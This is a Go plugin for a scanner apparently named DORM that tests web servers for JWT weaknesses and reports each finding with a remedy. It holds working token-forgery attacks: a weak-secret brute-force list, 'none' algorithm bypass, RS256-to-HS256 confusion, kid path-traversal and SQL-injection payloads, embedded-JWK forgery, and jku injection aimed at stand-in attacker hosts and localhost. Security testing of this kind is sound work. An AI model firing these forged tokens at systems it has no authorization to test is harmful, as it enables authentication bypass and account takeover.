package plugins

import (
	"DORM/models"
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"strings"
	"time"
)

// ==============================================================
// JWT WEAKNESS — v3.0
// ==============================================================
type JWTWeaknessPlugin struct{}

func (p *JWTWeaknessPlugin) Name() string { return "JWT Security Scanner (Key Breaker v3)" }

// ── Weak secret dictionary ─────────────────────────────────────────────────
var jwtWeakSecrets = []string{
	// common
	"secret", "password", "123456", "jwt", "key", "123", "12345",
	"admin", "test", "app", "api", "auth", "server", "changeme",
	"token", "dev", "user", "access", "root", "supersecret",
	// extended
	"qwerty", "letmein", "abc123", "iloveyou", "monkey", "master",
	"dragon", "111111", "passw0rd", "hello", "welcome", "login",
	"jwt_secret", "your-256-bit-secret", "HS256Key", "secretkey",
	"jwt-key-2024", "myapp_secret", "prod_jwt_secret", "super_secret_key",
	"mysecretpassword", "jwtpassword", "flask_secret", "django-insecure",
	"rails_secret_key_base", "your-secret-key", "mysecret", "pass",
	"1234567890", "abcdefgh", "secret123", "password123", "apikey",
	"appkey", "privatekey", "sessionkey", "tokenkey", "jwttoken",
	"signingkey", "hmackey", "appSecret", "clientSecret", "serverKey",
	"webtoken", "accesstoken", "bearertoken", "refresh_secret", "prod_secret",
	"dev_secret", "staging_secret", "local_secret", "test_secret", "mysupersecret",
}

// ── JWK Discovery Endpoints ───────────────────────────────────────────────
var jwksEndpoints = []string{
	"/.well-known/jwks.json",
	"/jwks.json",
	"/api/jwks",
	"/auth/jwks",
	"/.well-known/openid-configuration",
	"/oauth/discovery/keys",
	"/api/auth/jwks",
	"/v1/jwks",
}

// ── KID Injection Payloads ────────────────────────────────────────────────
var kidPayloads = []struct {
	KID    string
	Secret string // HS256 secret to use when KID is injected
	Label  string
}{
	{"../../../../dev/null", "", "KID Path Traversal → /dev/null (empty secret)"},
	{"../../../etc/passwd", "", "KID Path Traversal → /etc/passwd"},
	{"' UNION SELECT 'hacked'-- -", "hacked", "KID SQL Injection (UNION)"},
	{"1 OR 1=1-- -", "secret", "KID SQL Injection (boolean)"},
	{"../keys/private.pem", "", "KID Traversal → private key file"},
}

// ── Fetch JWKS and extract RSA public key ─────────────────────────────────
func fetchRSAPublicKey(baseURL string) *rsa.PublicKey {
	httpClient := &http.Client{
		Timeout: 6 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for _, ep := range jwksEndpoints {
		resp, err := httpClient.Get(baseURL + ep)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 32768))
		resp.Body.Close()

		var jwks struct {
			Keys []struct {
				Kty string   `json:"kty"`
				N   string   `json:"n"`
				E   string   `json:"e"`
				X5c []string `json:"x5c"`
			} `json:"keys"`
		}
		if json.Unmarshal(body, &jwks) != nil {
			continue
		}

		for _, k := range jwks.Keys {
			if k.Kty == "RSA" && k.N != "" && k.E != "" {
				nBytes, err1 := base64.RawURLEncoding.DecodeString(k.N)
				eBytes, err2 := base64.RawURLEncoding.DecodeString(k.E)
				if err1 != nil || err2 != nil {
					continue
				}
				n := new(big.Int).SetBytes(nBytes)
				var eInt int
				for _, b := range eBytes {
					eInt = eInt<<8 | int(b)
				}
				return &rsa.PublicKey{N: n, E: eInt}
			}
			// x5c PEM certificate fallback
			if len(k.X5c) > 0 {
				certDER, err := base64.StdEncoding.DecodeString(k.X5c[0])
				if err != nil {
					continue
				}
				cert, err := x509.ParseCertificate(certDER)
				if err != nil {
					continue
				}
				if pub, ok := cert.PublicKey.(*rsa.PublicKey); ok {
					return pub
				}
			}
		}
	}
	return nil
}

// rsaPublicKeyToPEM converts an RSA public key to PEM-encoded bytes (PKIX DER).
func rsaPublicKeyToPEM(pub *rsa.PublicKey) []byte {
	derBytes, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return nil
	}
	return pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: derBytes})
}

// buildKIDToken creates a JWT with a manipulated KID header field.
func buildKIDToken(origHeaderB64, origPayloadB64, kid string, secret []byte) string {
	headerMap := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
		"kid": kid,
	}
	headerJSON, _ := json.Marshal(headerMap)
	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	return signHS256(headerB64, origPayloadB64, secret)
}

// buildJWKEmbedToken embeds a self-signed JWK into the JWT header.
func buildJWKEmbedToken(origPayloadB64 string, secret []byte) string {
	jwkObj := map[string]interface{}{
		"kty": "oct",
		"k":   base64.RawURLEncoding.EncodeToString(secret),
	}
	headerMap := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
		"jwk": jwkObj,
	}
	headerJSON, _ := json.Marshal(headerMap)
	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	return signHS256(headerB64, origPayloadB64, secret)
}

// buildJKUToken builds a JWT with a jku pointing to a crafted URL.
func buildJKUToken(origPayloadB64, jkuURL string, secret []byte) string {
	headerMap := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
		"jku": jkuURL,
	}
	headerJSON, _ := json.Marshal(headerMap)
	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	return signHS256(headerB64, origPayloadB64, secret)
}

// ── Main plugin ───────────────────────────────────────────────────────────
func (p *JWTWeaknessPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	// ── Collect URLs to probe (root + Spider-discovered) ─────────────
	probeURLs := []string{getURL(target, "/")}
	if existing, ok := models.SharedData.Load("endpoints_" + target.IP); ok {
		for _, ep := range existing.([]models.Endpoint) {
			probeURLs = append(probeURLs, ep.URL)
		}
	}

	var token, origHeaderB64, origPayloadB64 string

	// Find the first valid JWT across probe URLs
	for _, pu := range probeURLs {
		resp, err := client.Get(pu)
		if err != nil {
			continue
		}
		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 131072))
		resp.Body.Close()

		t := findJWT(string(bodyBytes), resp.Header)
		if t == "" {
			continue
		}
		h, pay, _, valid := parseAndValidateJWT(t)
		if !valid {
			continue
		}
		token = t
		origHeaderB64 = h
		origPayloadB64 = pay
		break
	}

	if token == "" {
		return nil
	}

	// Verify server actually validates JWTs (sanity check)
	badToken := "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkdW1teSJ9.invalid_signature_block"
	reqCheck, _ := http.NewRequest("GET", getURL(target, "/"), nil)
	reqCheck.Header.Set("Authorization", "Bearer "+badToken)
	respCheck, err := client.Do(reqCheck)
	if err != nil {
		return nil
	}
	respCheck.Body.Close()
	if respCheck.StatusCode == 200 {
		return nil // JWT not enforced
	}

	testToken := func(tok, endpoint string) bool {
		req, _ := http.NewRequest("GET", getURL(target, endpoint), nil)
		req.Header.Set("Authorization", "Bearer "+tok)
		r, err := client.Do(req)
		if err != nil {
			return false
		}
		defer r.Body.Close()
		return r.StatusCode == 200
	}

	// ══════════════════════════════════════════════════════════════════
	// ATTACK 1 — Weak Secret Brute-Force (HS256)
	// ══════════════════════════════════════════════════════════════════
	for _, secret := range jwtWeakSecrets {
		forgedToken := signHS256(origHeaderB64, origPayloadB64, []byte(secret))
		if testToken(forgedToken, "/") {
			return &models.Vulnerability{
				Target:   target,
				Name:     "Weak JWT Secret (Brute-Force Cracked)",
				Severity: "CRITICAL",
				CVSS:     9.8,
				Description: fmt.Sprintf(
					"JWT signing secret is weak and was cracked via dictionary attack.\n"+
						"Secret: '%s'\nThis allows complete account takeover.",
					secret,
				),
				Solution:  "Use a cryptographically random JWT secret of at least 256 bits.",
				Reference: "CWE-798 / OWASP A07:2021",
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════
	// ATTACK 2 — 'None' Algorithm Bypass
	// ══════════════════════════════════════════════════════════════════
	headerBytes, _ := base64.RawURLEncoding.DecodeString(origHeaderB64)
	var headerMap map[string]interface{}
	json.Unmarshal(headerBytes, &headerMap)

	for _, alg := range []string{"none", "None", "NONE", "nOnE", "NoNe"} {
		headerMap["alg"] = alg
		newHeaderJSON, _ := json.Marshal(headerMap)
		newHeaderB64 := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
		noneToken := fmt.Sprintf("%s.%s.", newHeaderB64, origPayloadB64)

		if testToken(noneToken, "/") {
			return &models.Vulnerability{
				Target:   target,
				Name:     fmt.Sprintf("JWT 'None' Algorithm Bypass (alg: %s)", alg),
				Severity: "CRITICAL",
				CVSS:     9.1,
				Description: fmt.Sprintf(
					"Server accepted an unsigned JWT (alg: %s).\n"+
						"Any user can forge tokens without knowing the secret key.",
					alg,
				),
				Solution:  "Explicitly reject the 'none' algorithm in JWT validation library config.",
				Reference: "RFC 7519 §6 / CVE-2015-9235",
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════
	// ATTACK 3 — Algorithm Confusion: RS256 → HS256 (using public key)
	// ══════════════════════════════════════════════════════════════════
	algIsAsymmetric := false
	if alg, ok := headerMap["alg"].(string); ok {
		algIsAsymmetric = strings.HasPrefix(alg, "RS") || strings.HasPrefix(alg, "ES") || strings.HasPrefix(alg, "PS")
	}

	if algIsAsymmetric {
		rsaPub := fetchRSAPublicKey(baseURL)
		if rsaPub != nil {
			pemBytes := rsaPublicKeyToPEM(rsaPub)
			if pemBytes != nil {
				// Forge HS256 token using the RSA public key as HMAC secret
				hs256HeaderMap := map[string]interface{}{
					"alg": "HS256",
					"typ": "JWT",
				}
				hs256HeaderJSON, _ := json.Marshal(hs256HeaderMap)
				hs256HeaderB64 := base64.RawURLEncoding.EncodeToString(hs256HeaderJSON)
				confusionToken := signHS256(hs256HeaderB64, origPayloadB64, pemBytes)

				if testToken(confusionToken, "/") {
					return &models.Vulnerability{
						Target:   target,
						Name:     "JWT Algorithm Confusion Attack (RS256 → HS256)",
						Severity: "CRITICAL",
						CVSS:     9.8,
						Description: "Server accepted an HS256 token signed with its own RSA public key.\n" +
							"The public key (obtainable from JWKS endpoint) was used as the HMAC secret,\n" +
							"bypassing signature verification entirely. Full account takeover possible.",
						Solution:  "Enforce algorithm type in JWT verification. Never mix asymmetric/symmetric key validators.",
						Reference: "CVE-2016-5431 / PortSwigger JWT Algorithm Confusion",
					}
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════
	// ATTACK 4 — KID Injection (Path Traversal + SQL Injection)
	// ══════════════════════════════════════════════════════════════════
	for _, kidProbe := range kidPayloads {
		secret := []byte(kidProbe.Secret) // may be empty → empty HMAC
		tok := buildKIDToken(origHeaderB64, origPayloadB64, kidProbe.KID, secret)

		if testToken(tok, "/") {
			return &models.Vulnerability{
				Target:   target,
				Name:     "JWT KID Header Injection",
				Severity: "CRITICAL",
				CVSS:     9.8,
				Description: fmt.Sprintf(
					"JWT 'kid' (Key ID) header parameter injection successful.\n"+
						"Technique: %s\nKID Value: %s\n"+
						"Attacker can forge arbitrary tokens by controlling key lookup.",
					kidProbe.Label, kidProbe.KID,
				),
				Solution:  "Validate 'kid' parameter strictly. Never use it in SQL queries or filesystem paths.",
				Reference: "CWE-20 / OWASP JWT Security Cheat Sheet",
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════
	// ATTACK 5 — JWK Self-Embed (attacker-controlled key in header)
	// ══════════════════════════════════════════════════════════════════
	embeddedSecret := []byte("dorm_embedded_jwk_key_2024")
	jwkTok := buildJWKEmbedToken(origPayloadB64, embeddedSecret)
	if testToken(jwkTok, "/") {
		return &models.Vulnerability{
			Target:   target,
			Name:     "JWT JWK Header Injection (Self-Signed Key)",
			Severity: "CRITICAL",
			CVSS:     9.8,
			Description: "Server accepted a JWT containing an embedded JWK (JSON Web Key) in the header.\n" +
				"Attacker can supply their own public key and sign tokens with the corresponding private key.",
			Solution:  "Ignore 'jwk' header parameter. Only verify against pre-configured trusted keys.",
			Reference: "CVE-2018-0114 / PortSwigger JWT JWK Injection",
		}
	}

	// ══════════════════════════════════════════════════════════════════
	// ATTACK 6 — JKU (JSON Web Key Set URL) Injection
	// ══════════════════════════════════════════════════════════════════
	// Inject crafted JWKS URLs (attacker-controlled endpoints)
	jkuTargets := []string{
		"https://evil.example.com/jwks.json",
		"http://127.0.0.1:8081/jwks.json", // SSRF via JKU
		"https://attacker.ngrok.io/jwks",
	}
	jkuSecret := []byte("jku_test_secret")
	for _, jku := range jkuTargets {
		jkuTok := buildJKUToken(origPayloadB64, jku, jkuSecret)
		// We send the token — if the server makes an outbound request (SSRF) or accepts it
		req, _ := http.NewRequest("GET", getURL(target, "/"), nil)
		req.Header.Set("Authorization", "Bearer "+jkuTok)
		r, err := client.Do(req)
		if err == nil {
			body, _ := io.ReadAll(io.LimitReader(r.Body, 8192))
			r.Body.Close()
			// If server tried to fetch our JKU and accepted the token
			if r.StatusCode == 200 && !bytes.Contains(body, []byte("invalid")) {
				return &models.Vulnerability{
					Target:   target,
					Name:     "JWT JKU Header Injection (External Key URL)",
					Severity: "HIGH",
					CVSS:     8.1,
					Description: fmt.Sprintf(
						"Server may accept JWT with external 'jku' key URL.\n"+
							"This can lead to SSRF or forged token acceptance if the server fetches %s.",
						jku,
					),
					Solution:  "Whitelist allowed JWKS URLs. Never fetch arbitrary URLs from JWT headers.",
					Reference: "OWASP JWT Security Cheat Sheet / CWE-918",
				}
			}
		}
	}

	return nil
}
